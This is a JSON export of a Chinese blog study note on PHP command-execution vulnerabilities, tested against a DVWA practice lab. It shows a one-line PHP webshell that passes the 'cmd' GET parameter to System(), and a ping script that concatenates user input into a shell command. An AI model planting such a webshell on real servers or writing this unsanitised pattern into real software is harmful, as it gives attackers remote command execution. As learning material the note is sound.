{"title":"命令执行漏洞","uid":"8686173dd05c96864c4b86d1995d7aca","slug":"命令执行漏洞","date":"2020-03-09T07:45:54.000Z","updated":"2020-04-13T00:46:54.000Z","comments":true,"path":"api/articles/命令执行漏洞.json","keywords":"A1andNS","cover":[],"content":"<p>开发人员在进行开发的过程中，或多或少都会调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等。对于开发人员而言，使用这些函数可以方便去除系统的特殊功能等。但是也会带来一些命令执行漏洞。</p>\n<p>黑客在渗透应用时，可能控制了某些函数中的参数，从而把想要执行的恶意代码接入到原来的正常代码中一起执行。</p>\n<h2 id=\"PHP命令执行漏洞\"><a href=\"#PHP命令执行漏洞\" class=\"headerlink\" title=\"PHP命令执行漏洞\"></a>PHP命令执行漏洞</h2><p>PHP是一门脚本语言，比较简洁、方便，但是不是事先编译好的运行速度上自然是没有优势的。而且他不能接触到系统底层，所以就必须要调用系统函数来执行一些指令，自然就造成了漏洞。</p>\n<p>举几个例子来说明问题：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token function\">System</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这个我觉得也可以算一句话木马吧，结合命令执行的密码，很多时候程序员代码过滤环节到位，PHP命令执行漏洞很少，我们可以自己创造。</p>\n<p>我将其上传到DVWA里，进行访问<code>http://192.168.42.157/DVWA/hackable/uploads/1.php?cmd=ipconfig</code></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20191217224324864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2MTM5MDQ1,size_16,color_FFFFFF,t_70\" alt=\"1\"></p>\n<p>可以看到我输入的命令在系统中被执行了。</p>\n<p>再试一个简单的案例：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">System</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ping \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>编写是要注意在ping后面留空格，毕竟cmd命令还是很吃格式的，格式错了那么效果可能就达不到了。一开始写的时候没有注意这个地方，试了一会儿都出不来结果，最后打开cmd对着看了才发现了空格漏了。</p>\n<p>然后上传到DVWA靶机，在访问<code>http://192.168.42.157/DVWA/hackable/uploads/1.php?cmd=www.baidu.com</code></p>\n<p><img src=\"https://img-blog.csdnimg.cn/2019121722435027.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2MTM5MDQ1,size_16,color_FFFFFF,t_70\" alt=\"2\"></p>\n<p>结果可以看出我输入的参数被成功执行了。<br>这就是两个PHP的简单实例，当然除了代码里的系统函数调用的原因，还有可能是系统本身的漏洞造成命令执行。还有可能是调用的第三方组件纯在代码执行漏洞。这里我目前只有接触到PHP的所以就先这样了，还有很长的路需要走。</p>\n","text":"开发人员在进行开发的过程中，或多或少都会调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等。对于开发人员而言，使用这些函数可以方便去除系统的特殊功能等。但是也会带来一些命令执行漏洞。 黑客在渗...","link":"","photos":[],"count_time":{"symbolsCount":870,"symbolsTime":"1 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":32,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":32,"path":"api/tags/网络安全.json"},{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"命令执行","slug":"命令执行","count":1,"path":"api/tags/命令执行.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">PHP命令执行漏洞</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"一文简单入门文件上传","uid":"99138ec644b11a428edfab781d45e70d","slug":"一文简单入门文件上传","date":"2020-03-09T07:47:04.000Z","updated":"2020-04-13T00:46:40.000Z","comments":true,"path":"api/articles/一文简单入门文件上传.json","keywords":"A1andNS","cover":[],"text":"随着Web应用发展和广泛应用，很多的应用都允许用户上传自己的文件，以此提升用户体验。但是，这也就造成了一个web应用安全中很著名的漏洞，它就是文件上传漏洞。由于Web应用的上传功能的代码实现没有对用户上传文件的格式和后缀以及文件类型进行过滤，从而导致大家都可以任意上传文件到服务器...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":32,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":32,"path":"api/tags/网络安全.json"},{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"文件上传","slug":"文件上传","count":2,"path":"api/tags/文件上传.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Python初篇之温度转换","uid":"8423e555287e52bedc5c5606219a3af6","slug":"Python初篇之温度转换","date":"2020-03-09T07:45:00.000Z","updated":"2020-04-13T00:45:34.000Z","comments":true,"path":"api/articles/Python初篇之温度转换.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200323233608.png","text":"从一个简单的温度转换程序开始。本程序的设计目的是实现摄氏度与华氏度之间的转换，可以多次输入。使用方法：输入n或N终止程序摄氏度正确输入案例：1c、1C华氏度正确输入案例：1f、1FPython环境是Python3 tempstr=input(\"请输入一个带符号的温度值:\") wh...","link":"","photos":[],"count_time":{"symbolsCount":572,"symbolsTime":"1 mins."},"categories":[{"name":"Python学习","slug":"Python学习","count":19,"path":"api/categories/Python学习.json"}],"tags":[{"name":"Python","slug":"Python","count":23,"path":"api/tags/Python.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}